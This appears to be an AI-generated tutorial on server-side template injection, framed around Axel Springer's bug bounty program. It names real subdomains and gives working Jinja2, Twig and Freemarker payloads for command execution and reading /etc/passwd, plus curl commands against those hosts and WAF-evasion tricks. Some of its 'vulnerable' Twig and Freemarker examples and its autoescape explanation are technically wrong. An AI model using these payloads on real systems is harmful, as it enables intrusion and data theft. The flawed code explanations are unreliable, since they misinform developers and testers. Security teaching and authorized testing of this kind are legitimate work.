### What is Server-Side Template Injection (SSTI)?

SSTI occurs when user input is unsafely embedded into a server-side template, allowing attackers to manipulate the template engine’s syntax to execute malicious code. Templating engines (e.g., Jinja2, Twig, Freemarker) dynamically generate HTML by combining templates with data. If user input is included without proper sanitization, attackers can inject template expressions (e.g., `{{7*7}}` in Jinja2) to execute code or access sensitive server data.

**Key Points**:
- **Mechanism**: User input is processed as part of the template, enabling execution of template directives or server-side logic.
- **Impact**: Remote Code Execution (RCE), data leakage, privilege escalation, or server compromise.
- **Difference from HTML Injection/XSS**: SSTI executes server-side code, while HTML injection manipulates client-side HTML, and XSS executes client-side JavaScript.

---

### Scenario 1: SSTI in a Search Feature

**Context**: A news website (`sportbild.bild.de`) has a search feature (`/themes?q=`, similar to your XSS query’s `<form class="theme-search__form">`). The search query is rendered in a template (e.g., Jinja2) without sanitization.

**How It Leads to Vulnerability**:
- The application passes the user’s search query (`q`) directly to a Jinja2 template.
- An attacker injects a template expression (e.g., `{{7*7}}`), which the engine evaluates.
- Advanced payloads can access server objects (e.g., `{{config}}`) or execute commands.

**Attacker Manipulation**:
1. Attacker visits `https://sportbild.bild.de/themes?q={{7*7}}`.
2. The response shows `49`, confirming SSTI in a Jinja2 template.
3. Attacker escalates by injecting:
   ```url
   https://sportbild.bild.de/themes?q={{config.__class__.__init__.__globals__}}
   ```
   - Leaks sensitive configuration data (e.g., secret keys).
4. For RCE, the attacker tries:
   ```url
   https://sportbild.bild.de/themes?q={{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].decode()}}
   ```
   - Executes the `whoami` command, revealing the server’s user (e.g., `www-data`).

**Impact**:
- **RCE**: Executes arbitrary commands (e.g., `whoami`, `cat /etc/passwd`).
- **Data Leakage**: Exposes server variables, keys, or files.
- **Server Compromise**: Installs backdoors or escalates privileges.

---

### How to Find SSTI in Source Code

To identify SSTI vulnerabilities in source code, look for:
- **Direct User Input in Templates**: User input passed to template rendering functions without sanitization.
- **Template Engine Usage**: Presence of engines like Jinja2, Twig, Freemarker, or Velocity.
- **Lack of Escaping**: Absence of auto-escaping or manual sanitization.
- **Dynamic Template Strings**: Templates constructed from user input (e.g., `render_template_string`).

**Tools**:
- **Static Analysis**: Use Semgrep or grep:
  ```bash
  semgrep --config "p/security" *.py
  grep -r "render_template_string\|Template" *.py
  ```

---

### Vulnerable SSTI Code Snippets

Below are three vulnerable code snippets in different languages (Python Flask/Jinja2, PHP/Twig, Java/Freemarker), explaining where vulnerabilities occur and how to mitigate them.

#### 1. Python Flask with Jinja2 - Search Query Injection
**Code**:
```python
# app.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q')
    return render_template_string(f"Search results for: {query}")
```
**Vulnerability**:
- **Location**: `render_template_string` directly embeds `query` into a template string.
- **Issue**: If `q={{7*7}}`, Jinja2 evaluates it to `49`. Malicious payloads like `{{config}}` leak server data or enable RCE.
- **Manipulation**: Attacker visits:
  ```url
  /search?q={{7*7}}
  ```
  - Response: `Search results for: 49`, confirming SSTI.

**Mitigation**:
- Use `render_template` with auto-escaping or sanitize input:
```python
from flask import Flask, request, render_template
app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q')
    return render_template('search.html', query=query)
```
- **search.html**:
  ```html
  Search results for: {{ query | e }}
  ```
- **Explanation**: Jinja2’s `| e` filter escapes template syntax, preventing evaluation.

#### 2. PHP with Twig - Profile Display
**Code**:
```php
<?php
// profile.php
require 'vendor/autoload.php';
$loader = new \Twig\Loader\ArrayLoader(['profile' => 'Hello, {{ name }}']);
$twig = new \Twig\Environment($loader);
$name = $_POST['name'];
echo $twig->render('profile', ['name' => $name]);
?>
```
**Vulnerability**:
- **Location**: `$name` is passed directly to Twig’s `render` without sanitization.
- **Issue**: If `name={{7*7}}`, Twig evaluates it to `49`. Payloads like `{{_self.env.getTemplate('../../../../etc/passwd')}}` can read files.
- **Manipulation**: Attacker submits:
  ```html
  name={{7*7}}
  ```
  - Response: `Hello, 49`, confirming SSTI.

**Mitigation**:
- Enable Twig’s auto-escaping or sanitize input:
```php
<?php
require 'vendor/autoload.php';
$loader = new \Twig\Loader\ArrayLoader(['profile' => 'Hello, {{ name }}']);
$twig = new \Twig\Environment($loader, ['autoescape' => 'html']);
$name = htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
echo $twig->render('profile', ['name' => $name]);
?>
```
- **Explanation**: `autoescape` escapes template syntax, and `htmlspecialchars` prevents HTML injection.

#### 3. Java with Freemarker - User Greeting
**Code**:
```java
// Main.java
import freemarker.template.*;
import spark.*;

public class Main {
    public static void main(String[] args) {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
        cfg.setClassForTemplateLoading(Main.class, "/");

        get("/greet", (req, res) -> {
            String user = req.queryParams("user");
            Template temp = cfg.getTemplate("greet.ftl");
            StringWriter out = new StringWriter();
            temp.process(Map.of("user", user), out);
            return out.toString();
        });
    }
}
// greet.ftl: Hello, ${user}
```
**Vulnerability**:
- **Location**: `user` is passed to Freemarker’s `process` without sanitization.
- **Issue**: If `user=${7*7}`, Freemarker evaluates it to `49`. Payloads like `${"freemarker.template.utility.Execute"?new()("whoami")}` execute commands.
- **Manipulation**: Attacker visits:
  ```url
  /greet?user=${7*7}
  ```
  - Response: `Hello, 49`, confirming SSTI.

**Mitigation**:
- Sanitize input and restrict Freemarker directives:
```java
import freemarker.template.*;
import spark.*;

public class Main {
    public static void main(String[] args) {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
        cfg.setClassForTemplateLoading(Main.class, "/");
        cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
        cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);

        get("/greet", (req, res) -> {
            String user = req.queryParams("user").replaceAll("[${}]", "");
            Template temp = cfg.getTemplate("greet.ftl");
            StringWriter out = new StringWriter();
            temp.process(Map.of("user", user), out);
            return out.toString();
        });
    }
}
```
- **Explanation**: `SAFER_RESOLVER` restricts dangerous classes, and regex removes template syntax.

---

### Finding SSTI in DAST (Dynamic Application Security Testing)

**DAST Approach**:
DAST tools test running applications by sending malicious template payloads and analyzing responses for signs of template evaluation. Unlike SAST, DAST doesn’t require source code.

**Steps to Find SSTI**:
1. **Crawl the Application**:
   - Use OWASP ZAP or Burp Suite’s Spider to map endpoints (e.g., `/themes`, `/search`).
   - Example:
     ```bash
     zap-cli spider https://sportbild.bild.de
     ```

2. **Inject Test Payloads**:
   - Send template expressions for common engines:
     - Jinja2: `{{7*7}}`, `{{config}}`
     - Twig: `{{7*7}}`, `{{_self.env}}`
     - Freemarker: `${7*7}`, `${"java.lang.System".getProperty("user.dir")}`
   - Use Burp Intruder to fuzz inputs:
     - Payload list: `{{7*7}}`, `${7*7}`, `{% debug %}`, etc.
     - Target: `q` in `/themes?q=`.

3. **Analyze Responses**:
   - Check if `{{7*7}}` returns `49`, indicating template evaluation.
   - Look for errors revealing the engine (e.g., Jinja2’s `TemplateSyntaxError`).
   - Example: Send:
     ```http
     GET /themes?q={{7*7}} HTTP/1.1
     Host: sportbild.bild.de
     ```
     - If response contains `49`, it’s SSTI.

4. **Confirm It’s SSTI**:
   - **SSTI**: Payloads like `{{7*7}}` evaluate to `49`, or `{{config}}` leaks server data.
   - **Not HTML Injection**: HTML tags (e.g., `<b>Test</b>`) render as HTML, not template code.
   - **Not XSS**: Requires client-side JavaScript execution (e.g., `<script>`), not server-side evaluation.
   - Test engine-specific payloads:
     - Jinja2: `{{''.__class__.__mro__[1].__subclasses__()}}`
     - Twig: `{{app.request.server.all|join(',')}}`
     - Freemarker: `${"java.lang.Runtime".getRuntime().exec("id")}`

5. **Automate with Tools**:
   - OWASP ZAP active scan:
     ```bash
     zap-cli active-scan --recursive https://sportbild.bild.de
     ```
   - Nuclei with SSTI templates:
     ```bash
     nuclei -u https://sportbild.bild.de -t injection/ssti
     ```

**How to Definitively Confirm SSTI**:
- **Evaluation Check**: Mathematical expressions (e.g., `{{7*7}}` → `49`) or object access (e.g., `{{config}}`) confirm server-side template execution.
- **Engine Fingerprinting**: Errors or specific outputs (e.g., Jinja2’s `__class__`) identify the engine.
- **No Client-Side Execution**: Unlike XSS, SSTI doesn’t rely on browser JavaScript.
- **Response Analysis**: Use Burp Suite to verify payload evaluation in the response.

---

### Impact of SSTI

- **Remote Code Execution (RCE)**: Execute OS commands (e.g., `whoami`, `rm -rf /`).
- **Data Leakage**: Access server variables, files, or database credentials.
- **Privilege Escalation**: Gain admin access by manipulating server state.
- **Server Compromise**: Install malware or backdoors.
- **Compliance Violations**: Data leaks violate GDPR, CCPA, etc.
- **Severity**: Critical (OWASP A1: Injection), due to RCE potential.

---

### Scenario 2: SSTI in a User Profile

**Context**: A profile page on `club.autobild.de` allows users to set a bio, rendered by a Twig template without sanitization.

**How It Leads to Vulnerability**:
- The bio is passed to Twig’s `render` function, evaluating template code.
- An attacker injects Twig syntax to access server data or execute commands.

**Attacker Manipulation**:
1. Attacker creates an account on `club.autobild.de`.
2. Sets bio to:
   ```html
   {{7*7}}
   ```
3. Profile shows `49`, confirming Twig SSTI.
4. Attacker escalates with:
   ```html
   {{_self.env.getTemplate('../../../../etc/passwd')}}
   ```
   - Leaks `/etc/passwd`, exposing system users.
5. For RCE, the attacker tries:
   ```html
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
   ```
   - Executes `whoami`, revealing `www-data`.

**Impact**:
- **Stored SSTI**: Affects all profile visitors, amplifying damage.
- **Data Breach**: Leaks sensitive files or credentials.
- **Server Takeover**: RCE enables full control.

---

### Mitigation Strategies (General)

- **Avoid Dynamic Templates**:
  - Use static templates (e.g., `render_template` instead of `render_template_string`).
- **Sanitize Input**:
  - Remove template syntax (e.g., `{{`, `${`) using regex:
    ```python
    query = query.replace('{{', '').replace('}}', '')
    ```
- **Enable Auto-Escaping**:
  - Configure engines to escape output (e.g., Twig’s `autoescape`, Jinja2’s `| e`).
- **Restrict Template Features**:
  - Disable dangerous functions (e.g., Freemarker’s `?new()`, Jinja2’s `__subclasses__`).
  - Use sandboxing (e.g., Jinja2’s `Environment` with restricted globals).
- **Content Security Policy (CSP)**:
  - Mitigate XSS escalation:
    ```http
    Content-Security-Policy: script-src 'self'
    ```
- **WAF Configuration**:
  - Block template syntax (e.g., `{{`, `${`) via Cloudflare rules.
- **Secure Development**:
  - Follow OWASP guidelines (A1: Injection).

---

### Testing in Axel Springer’s Bug Bounty Program

To find SSTI on Axel Springer’s domains (`*.bild.de`, `*.welt.de`, etc.):

1. **Identify Input Points**:
   - Crawl for forms, search bars, or profile fields:
     ```bash
     gau bild.de | grep -i "form|search|profile|themes" | httprobe > bild_urls.txt
     ```
   - Focus on `/themes` (per your XSS query).

2. **Inject Payloads**:
   - Test template expressions:
     ```bash
     curl -X GET "https://sportbild.bild.de/themes?q={{7*7}}"
     ```
   - Escalate to RCE:
     ```bash
     curl -X GET "https://sportbild.bild.de/themes?q={{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].decode()}}"
     ```
   - Use Burp Intruder to fuzz inputs.

3. **Confirm Evaluation**:
   - Check if `{{7*7}}` returns `49`.
   - Use DevTools to inspect responses for server data leaks.

4. **WAF Evasion (Cloudflare)**:
   - Encode payloads:
     ```url
     {{7*7}} -> %7B%7B7*7%7D%7D
     ```
   - Split payloads:
     ```url
     {{7*}}7}}
     ```

5. **Ethics**:
   - Use test accounts (e.g., `club.autobild.de`).
   - Avoid destructive RCE (e.g., `rm -rf /`).
   - Comply with Intigriti’s rules.

---

### Reporting to Axel Springer’s Bug Bounty Program

Submit via Intigriti (`https://app.intigriti.com/programs/axelspringerse/axelspringersevulnerabilitydisclosureprogram/detail`):

- **Details**:
  - Subdomain: e.g., `sportbild.bild.de`.
  - Endpoint: e.g., `/themes`.
  - Vulnerability: SSTI leading to RCE.
  - Payload: `{{7*7}}`, `{{config}}`.
  - Steps:
    1. Submitted `{{7*7}}` in search form (`/themes?q=`).
    2. Response showed `49`, confirming SSTI.
    3. Leaked config with `{{config}}`.
  - Impact: “Enables RCE, data leakage, and server compromise.”
- **Evidence**:
  - Screenshot of `49` or config data.
  - HTTP request/response showing evaluation.
- **Severity**: Critical (RCE).
- **Mitigation**:
  - Avoid `render_template_string`.
  - Enable auto-escaping and sandboxing.

---

### Advanced Interview Question
**Question**: If you find SSTI on `club.autobild.de`’s profile page, how would you verify, escalate, and report it?

**Answer**:
- **Verification**:
  - Submit `{{7*7}}` as a bio via `/profile`.
  - Confirm response shows `49`.
  - Test `{{config}}` to leak server data.
  - Use Burp Repeater to analyze responses.
- **Escalation**:
  - Inject RCE payload: `{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].decode()}}`.
  - Show file read: `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].decode()}}`.
  - Highlight stored impact: “Affects all profile visitors.”
- **Reporting**:
  - Submit via Intigriti:
    - Subdomain: `club.autobild.de`.
    - Endpoint: `/profile`.
    - Payload: `{{7*7}}`.
    - Steps, screenshot of `49`.
    - Impact: “RCE and data leakage.”
  - Suggest mitigations: sandboxing, input sanitization.
- **Ethics**: Use test accounts, avoid destructive commands.

---
